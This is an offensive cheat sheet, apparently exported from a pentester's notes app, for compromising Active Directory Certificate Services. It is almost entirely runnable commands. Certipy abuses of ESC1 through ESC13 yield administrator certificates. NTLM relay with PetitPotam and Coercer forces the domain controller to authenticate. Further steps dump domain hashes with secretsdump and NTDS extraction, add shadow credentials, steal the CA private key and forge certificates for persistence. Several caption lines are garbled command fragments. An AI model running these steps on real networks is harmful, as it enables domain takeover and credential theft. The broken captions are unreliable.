---
id: "mev6k2u3vmpn06uet"
title: "adcs"
description: ""
tags: []
order: "6"
createdAt: "2026-05-26T19:03:29.909Z"
updatedAt: "2026-05-26T19:03:43.647Z"
---

## Recon & Enumeration
<!-- section: {"id":"dqd5pyi8gmpn074ua","order":0,"collapsed":false} -->

### l0qe6ovy3mpn074wc
```bash
nmap -sV -sC -p 80,443,8080 $TARGET
nmap -sV -p 80,443 --script http-auth-finder $TARGET
netexec ldap $DC -u $USER -p $PASS -M adcs
```

_Recon & Enumeration Initial ADCS port detection and service fingerprinting._

**Tags:** adcs, recon, nmap, netexec
<!-- cmd: {"id":"l0qe6ovy3mpn074wc","language":"bash","sectionId":"dqd5pyi8gmpn074ua","tags":["adcs","recon","nmap","netexec"]} -->

### 9rauqc8nxmpn074wg
```bash
# Find CA servers
netexec ldap $DC -u $USER -p $PASS -M adcs
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -output ./adcs_enum
```

_Tags: #adcs, #recon, #nmap, #netexec Find ADCS enrollment endpoints via LDAP._

**Tags:** adcs, certipy, enum, ldap, authenticated
<!-- cmd: {"id":"9rauqc8nxmpn074wg","language":"bash","sectionId":"dqd5pyi8gmpn074ua","tags":["adcs","certipy","enum","ldap","authenticated"]} -->

### y0kwwg1f6mpn074wl
```bash
ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local" \
  "(objectClass=pKIEnrollmentService)" \
  cn dNSHostName cACertificate certificateTemplates

ldapsearch -x -H ldap://$DC -D "$USER@$DOMAIN" -w "$PASS" \
  -b "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=$DOMAIN,DC=local" \
  "(objectClass=pKICertificateTemplate)" \
  cn msPKI-Certificate-Name-Flag msPKI-Enrollment-Flag pKIExtendedKeyUsage
```

_Tags: #adcs, #certipy, #enum, #ldap, #authenticated Find CA via LDAP manually._

**Tags:** adcs, ldap, enum, certificate-templates, ca
<!-- cmd: {"id":"y0kwwg1f6mpn074wl","language":"bash","sectionId":"dqd5pyi8gmpn074ua","tags":["adcs","ldap","enum","certificate-templates","ca"]} -->

### jzgw3lw36mpn074wo
```bash
curl -sk https://$TARGET/certsrv/ -o /dev/null -w "%{http_code}"
curl -sk http://$TARGET/certsrv/ -o /dev/null -w "%{http_code}"
curl -sk https://$TARGET/certsrv/certfnsh.asp
```

_Tags: #adcs, #ldap, #enum, #certificate-templates, #ca Check web enrollment endpoint availability._

**Tags:** adcs, web-enrollment, recon, curl
<!-- cmd: {"id":"jzgw3lw36mpn074wo","language":"bash","sectionId":"dqd5pyi8gmpn074ua","tags":["adcs","web-enrollment","recon","curl"]} -->

## Template Enumeration
<!-- section: {"id":"241dnlc6vmpn074uh","order":1,"collapsed":false} -->

### 15qi5hklmmpn074wy
```bash
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout -enabled
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -enabled -stdout
certipy find -u $USER@$DOMAIN -H $HASH -dc-ip $DC -vulnerable -stdout
```

_Template Enumeration Enumerate all certificate templates and permissions._

**Tags:** adcs, certipy, templates, enum, vulnerable
<!-- cmd: {"id":"15qi5hklmmpn074wy","language":"bash","sectionId":"241dnlc6vmpn074uh","tags":["adcs","certipy","templates","enum","vulnerable"]} -->

## ESC1 — SAN Abuse
<!-- section: {"id":"2zjol4e7qmpn074uk","order":2,"collapsed":false} -->

### n748wubs2mpn074x5
```bash
# Enumerate ESC1 vulnerable templates
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC1"

# Request certificate as Domain Admin
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE" \
  -upn administrator@$DOMAIN

# Authenticate with certificate and get NT hash
certipy auth -pfx administrator.pfx -dc-ip $DC
certipy auth -pfx administrator.pfx -dc-ip $DC -domain $DOMAIN
```

_ESC1 — SAN Abuse Template allows requestor to supply Subject Alternative Name + Client Auth EKU._

**Tags:** adcs, esc1, san-abuse, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"n748wubs2mpn074x5","language":"bash","sectionId":"2zjol4e7qmpn074uk","tags":["adcs","esc1","san-abuse","certipy","privilege-escalation","ad-abuse"]} -->

## ESC2 — Any Purpose EKU
<!-- section: {"id":"8bywsr7vfmpn074uo","order":3,"collapsed":false} -->

### 5gncu24wompn074xd
```bash
# Enumerate ESC2
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC2"

# Request certificate
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE"

# Use as sub-CA to issue another cert with SAN
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE" \
  -upn administrator@$DOMAIN
```

_ESC2 — Any Purpose EKU Template has Any Purpose EKU or no EKU — can be used for any purpose._

**Tags:** adcs, esc2, any-purpose-eku, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"5gncu24wompn074xd","language":"bash","sectionId":"8bywsr7vfmpn074uo","tags":["adcs","esc2","any-purpose-eku","certipy","privilege-escalation","ad-abuse"]} -->

## ESC3 — Enrollment Agent Abuse
<!-- section: {"id":"6osar6vqnmpn074ur","order":4,"collapsed":false} -->

### av27hkceqmpn074xm
```bash
# Step 1 — Request Enrollment Agent certificate
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$ENROLLMENT_AGENT_TEMPLATE"

# Step 2 — Request cert on behalf of admin using agent cert
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE" \
  -on-behalf-of "$DOMAIN\\Administrator" \
  -pfx agent.pfx

# Step 3 — Authenticate
certipy auth -pfx administrator.pfx -dc-ip $DC
```

_NAME" -template "$ENROLLMENT_

**Tags:** adcs, esc3, enrollment-agent, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"av27hkceqmpn074xm","language":"bash","sectionId":"6osar6vqnmpn074ur","tags":["adcs","esc3","enrollment-agent","certipy","privilege-escalation","ad-abuse"]} -->

## ESC4 — Template ACL Misconfiguration
<!-- section: {"id":"ktqq89vz0mpn074uv","order":5,"collapsed":false} -->

### 32hepm4bqmpn074xr
```bash
# Enumerate write permissions on templates
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC4"

# Modify template to be ESC1 vulnerable
certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -template "$TEMPLATE" -save-old

# Request cert as admin after modification
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE" \
  -upn administrator@$DOMAIN

# Restore original template
certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -template "$TEMPLATE" -configuration "$TEMPLATE.json"

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip $DC
```

_ESC4 — Template ACL Misconfiguration Current user has write permissions over vulnerable template — modify to ESC1._

**Tags:** adcs, esc4, template-acl, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"32hepm4bqmpn074xr","language":"bash","sectionId":"ktqq89vz0mpn074uv","tags":["adcs","esc4","template-acl","certipy","privilege-escalation","ad-abuse"]} -->

## ESC6 — EDITF_ATTRIBUTESUBJECTALTNAME2
<!-- section: {"id":"lq68pri0ympn074ux","order":6,"collapsed":false} -->

### zcap8c68umpn074y5
```bash
# Check CA flag
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 5 "ESC6"
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep "EDITF_ATTRIBUTESUBJECTALTNAME2"

# Request cert with any template + SAN
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "User" \
  -upn administrator@$DOMAIN

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip $DC
```

_ESC6 — EDITF_

**Tags:** adcs, esc6, editf-flag, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"zcap8c68umpn074y5","language":"bash","sectionId":"lq68pri0ympn074ux","tags":["adcs","esc6","editf-flag","certipy","privilege-escalation","ad-abuse"]} -->

## ESC7 — CA Officer / Manager Abuse
<!-- section: {"id":"jlll3cd7fmpn074v1","order":7,"collapsed":false} -->

### un3uw49gnmpn074yd
```bash
# Check ESC7
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC7"

# Add self as CA officer
certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -add-officer $USER

# Enable vulnerable template
certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -enable-template "SubCA"

# Request cert
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "SubCA" \
  -upn administrator@$DOMAIN

# Issue failed request manually
certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -issue-request $REQUEST_ID

# Retrieve issued cert
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -retrieve $REQUEST_ID

# Authenticate
certipy auth -pfx administrator.pfx -dc-ip $DC
```

_NAME" -issue-request $REQUEST_

**Tags:** adcs, esc7, manage-ca, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"un3uw49gnmpn074yd","language":"bash","sectionId":"jlll3cd7fmpn074v1","tags":["adcs","esc7","manage-ca","certipy","privilege-escalation","ad-abuse"]} -->

## ESC8 — NTLM Relay to HTTP Enrollment
<!-- section: {"id":"zjrsg7gnmmpn074v4","order":8,"collapsed":false} -->

### 87eg54rcvmpn074yk
```bash
# Terminal 1 — Start relay to ADCS HTTP enrollment
impacket-ntlmrelayx -t http://$CA_HOST/certsrv/certfnsh.asp \
  -smb2support --adcs --template "DomainController"

impacket-ntlmrelayx -t https://$CA_HOST/certsrv/certfnsh.asp \
  -smb2support --adcs --template "User"

# Terminal 2 — Coerce DC authentication
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $DC
impacket-PetitPotam $LHOST $DC
impacket-PetitPotam -u $USER -p $PASS -d $DOMAIN $LHOST $DC

# Use obtained certificate
certipy auth -pfx dc.pfx -dc-ip $DC
```

_ESC8 — NTLM Relay to HTTP Enrollment Relay NTLM to AD CS web enrollment — get certificate for relayed user._

**Tags:** adcs, esc8, ntlm-relay, web-enrollment, ntlmrelayx, petitpotam, ad-abuse
<!-- cmd: {"id":"87eg54rcvmpn074yk","language":"bash","sectionId":"zjrsg7gnmmpn074v4","tags":["adcs","esc8","ntlm-relay","web-enrollment","ntlmrelayx","petitpotam","ad-abuse"]} -->

## ESC9 — No Security Extension
<!-- section: {"id":"00v004dbempn074v8","order":9,"collapsed":false} -->

### menl5veggmpn074yt
```bash
# Enumerate ESC9
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC9"

# Change target user UPN to admin (requires GenericWrite)
certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -user $TARGET_USER -upn administrator@$DOMAIN

# Request cert as target user
certipy req -u $TARGET_USER@$DOMAIN -p $TARGET_PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE"

# Restore UPN
certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -user $TARGET_USER -upn $TARGET_USER@$DOMAIN

# Authenticate as admin
certipy auth -pfx administrator.pfx -username administrator -domain $DOMAIN -dc-ip $DC
```

_USER@$DOMAIN -p $TARGET_

**Tags:** adcs, esc9, no-security-extension, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"menl5veggmpn074yt","language":"bash","sectionId":"00v004dbempn074v8","tags":["adcs","esc9","no-security-extension","certipy","privilege-escalation","ad-abuse"]} -->

## ESC10 — Weak Certificate Mapping
<!-- section: {"id":"6iweak8t1mpn074vb","order":10,"collapsed":false} -->

### 5r4t8cadhmpn074yz
```bash
# Enumerate ESC10
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC10"

# Case 1 — GenericWrite on user, change UPN then request cert
certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -user $TARGET_USER -upn administrator

certipy req -u $TARGET_USER@$DOMAIN -p $TARGET_PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "User"

certipy account update -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -user $TARGET_USER -upn $TARGET_USER@$DOMAIN

certipy auth -pfx administrator.pfx -domain $DOMAIN -dc-ip $DC
```

_USER@$DOMAIN -p $TARGET_

**Tags:** adcs, esc10, weak-mapping, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"5r4t8cadhmpn074yz","language":"bash","sectionId":"6iweak8t1mpn074vb","tags":["adcs","esc10","weak-mapping","certipy","privilege-escalation","ad-abuse"]} -->

## ESC11 — IF_ENFORCEENCRYPTICERTREQUEST Disabled
<!-- section: {"id":"e7ilbt1bompn074ve","order":11,"collapsed":false} -->

### sv6b1gyn5mpn074z5
```bash
# Enumerate ESC11
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC11"

# Relay to ICPR endpoint
impacket-ntlmrelayx -t rpc://$CA_HOST -rpc-mode ICPR \
  -icpr-ca-name "$CA_NAME" -smb2support \
  --adcs --template "DomainController"

# Coerce auth
coercer coerce -u $USER -p $PASS -d $DOMAIN -l $LHOST -t $DC

# Authenticate with obtained cert
certipy auth -pfx dc.pfx -dc-ip $DC
```

_ESC11 — IF_

**Tags:** adcs, esc11, rpc-relay, icpr, ntlmrelayx, ad-abuse
<!-- cmd: {"id":"sv6b1gyn5mpn074z5","language":"bash","sectionId":"e7ilbt1bompn074ve","tags":["adcs","esc11","rpc-relay","icpr","ntlmrelayx","ad-abuse"]} -->

## ESC13 — OID Group Link Abuse
<!-- section: {"id":"tp886x9cxmpn074vi","order":12,"collapsed":false} -->

### ymo2kruoampn074zh
```bash
# Enumerate ESC13
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout | grep -A 10 "ESC13"

# Request certificate with linked OID
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "$TEMPLATE"

# Authenticate — will inherit group membership
certipy auth -pfx $USER.pfx -dc-ip $DC
```

_ESC13 — OID Group Link Abuse Certificate template linked to AD group via issuance policy — grants group membership on auth._

**Tags:** adcs, esc13, oid-group, certipy, privilege-escalation, ad-abuse
<!-- cmd: {"id":"ymo2kruoampn074zh","language":"bash","sectionId":"tp886x9cxmpn074vi","tags":["adcs","esc13","oid-group","certipy","privilege-escalation","ad-abuse"]} -->

## Certificate Authentication
<!-- section: {"id":"nrdpiqvfgmpn074vk","order":13,"collapsed":false} -->

### f4qytd531mpn074zq
```bash
# Get TGT + NT hash from certificate
certipy auth -pfx administrator.pfx -dc-ip $DC
certipy auth -pfx administrator.pfx -dc-ip $DC -domain $DOMAIN
certipy auth -pfx administrator.pfx -dc-ip $DC -username administrator -domain $DOMAIN

# Use obtained TGT
export KRB5CCNAME=administrator.ccache
impacket-psexec $DOMAIN/administrator@$DC -k -no-pass
impacket-secretsdump $DOMAIN/administrator@$DC -k -no-pass

# Use obtained NT hash
impacket-secretsdump $DOMAIN/administrator@$DC -hashes :$HASH
netexec smb $DC -u administrator -H $HASH --ntds
```

_Certificate Authentication Authenticate using obtained certificate._

**Tags:** adcs, certipy, authentication, pkinit, pass-the-cert, privilege-escalation
<!-- cmd: {"id":"f4qytd531mpn074zq","language":"bash","sectionId":"nrdpiqvfgmpn074vk","tags":["adcs","certipy","authentication","pkinit","pass-the-cert","privilege-escalation"]} -->

## Shadow Credentials via ADCS
<!-- section: {"id":"pv9t1349empn074vo","order":14,"collapsed":false} -->

### zv6bm6t2hmpn074zy
```bash
# Add shadow credential to target
pywhisker.py -d $DOMAIN -u $USER -p $PASS --target $TARGET_USER --action add --dc-ip $DC

# Get TGT via PKINIT
impacket-getTGT $DOMAIN/$TARGET_USER -pfx-base64 $PFX_B64 -dc-ip $DC
export KRB5CCNAME=$TARGET_USER.ccache

# Get NT hash
certipy auth -pfx $TARGET_USER.pfx -dc-ip $DC
```

_USER -pfx-base64 $PFX_

**Tags:** adcs, shadow-credentials, pywhisker, pkinit, persistence, ad-abuse
<!-- cmd: {"id":"zv6bm6t2hmpn074zy","language":"bash","sectionId":"pv9t1349empn074vo","tags":["adcs","shadow-credentials","pywhisker","pkinit","persistence","ad-abuse"]} -->

## ADCS Persistence
<!-- section: {"id":"zvzoxkagympn074vr","order":15,"collapsed":false} -->

### vb8tn5nw5mpn07505
```bash
# Request user/machine cert for persistence
certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "User"

certipy req -u $USER@$DOMAIN -p $PASS -dc-ip $DC \
  -ca "$CA_NAME" -template "Machine"

# Forge certs using stolen CA private key
certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject "CN=Administrator"
certipy auth -pfx administrator_forged.pfx -dc-ip $DC
```

_ADCS Persistence Use ADCS for long-term persistence._

**Tags:** adcs, persistence, cert-forgery, certipy, ad-abuse
<!-- cmd: {"id":"vb8tn5nw5mpn07505","language":"bash","sectionId":"zvzoxkagympn074vr","tags":["adcs","persistence","cert-forgery","certipy","ad-abuse"]} -->

### s34jir74kmpn07507
```bash
# On CA server — dump CA cert + private key
certipy ca -backup -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca "$CA_NAME"
netexec smb $CA_HOST -u $USER -p $PASS -M certipy

# Offline — forge any certificate
certipy forge -ca-pfx "$CA_NAME.pfx" -upn administrator@$DOMAIN
certipy auth -pfx administrator_forged.pfx -dc-ip $DC
```

_Tags: #adcs, #persistence, #cert-forgery, #certipy, #ad-abuse Dump CA private key (if local admin on CA server)._

**Tags:** adcs, ca-backup, cert-forgery, certipy, persistence, golden-cert, ad-abuse
<!-- cmd: {"id":"s34jir74kmpn07507","language":"bash","sectionId":"zvzoxkagympn074vr","tags":["adcs","ca-backup","cert-forgery","certipy","persistence","golden-cert","ad-abuse"]} -->

## Misconfigurations Checklist
<!-- section: {"id":"h14krn6hbmpn074vv","order":16,"collapsed":false} -->

### bwcnnx96hmpn0750f
```bash
# 1. Full vulnerable template scan
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -vulnerable -stdout

# 2. Check CA flags (ESC6)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -i "EDITF_ATTRIBUTESUBJECTALTNAME2"

# 3. Check web enrollment (ESC8)
curl -sk http://$CA_HOST/certsrv/ -o /dev/null -w "%{http_code}\n"
curl -sk https://$CA_HOST/certsrv/ -o /dev/null -w "%{http_code}\n"

# 4. Check CA ACLs (ESC7)
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -i "Manage"

# 5. NTLM relay surface (ESC8/ESC11)
netexec ldap $DC -u $USER -p $PASS -M ldap-checker

# 6. Quick netexec ADCS module
netexec ldap $DC -u $USER -p $PASS -M adcs

# 7. All enrolled certificates for current user
certipy find -u $USER@$DOMAIN -p $PASS -dc-ip $DC -stdout | grep -i "Template"

# 8. CA backup rights
certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca "$CA_NAME" -list-templates
```

_HOST/certsrv/ -o /dev/null -w "%{http_

**Tags:** adcs, misconfiguration, checklist, certipy, esc1, esc6, esc7, esc8
<!-- cmd: {"id":"bwcnnx96hmpn0750f","language":"bash","sectionId":"h14krn6hbmpn074vv","tags":["adcs","misconfiguration","checklist","certipy","esc1","esc6","esc7","esc8"]} -->
